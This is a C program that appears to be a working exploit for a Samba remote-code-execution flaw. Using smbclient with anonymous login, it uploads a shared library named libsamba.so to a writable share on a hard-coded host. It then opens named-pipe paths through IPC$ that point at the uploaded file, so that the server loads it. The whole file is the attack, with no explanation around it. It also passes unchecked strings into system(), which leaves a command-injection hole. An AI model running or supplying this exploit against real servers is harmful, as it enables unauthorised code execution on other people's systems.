#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
int upload_module(char *path, char *user, char *pass, char *srcData)
{
		if(NULL == path || NULL == user || NULL == pass)
		{
				printf("The parameters are NULL \n");
       	return -1;
    }
		if((access("/usr/local/samba/bin/smbclient",F_OK)) == -1)
		{
				printf("The smbclient is not exist!\n");
		}
		int len = strlen(srcData);
		char p[1024] = {0};
		sprintf(p, "/usr/local/samba/bin/smbclient -c \"put %s\" //%s -N", srcData, path);
		system(p);
		return 0;
}

int load_module(char *path, char *user, char *pass, char *srcData)
{
		if(NULL == path || NULL == user || NULL == pass)
    {   
        printf("The parameters are NULL \n");
        return -1;
    }
    if((access("/usr/local/samba/bin/smbclient",F_OK)) == -1)
    {   
        printf("The smbclient is not exist!\n");
    }
    int len = strlen(srcData);
    char p[1024] = {0};
    sprintf(p, "/usr/local/samba/bin/smbclient -c \"open %s\" //%s -N", srcData, path);
    system(p);
		return 0;
}
int main(int *argc, char *argv[])
{
		char *srcData = "libsamba.so";
		if((access(srcData, F_OK)) == -1)
		{
				printf("%s is not exist\n", srcData);
				return -1;
		}
		upload_module("192.168.0.152/Share", "", "", srcData);
		char *pStr = "\\PIPE\\/home/chenzy/share/libsamba.so";
		load_module("192.168.0.152/IPC$", "", "", pStr);
		char *qStr = "/home/chenzy/share/libsamba.so";
		load_module("192.168.0.152/IPC$", "", "", qStr);
		
		return 0;
}
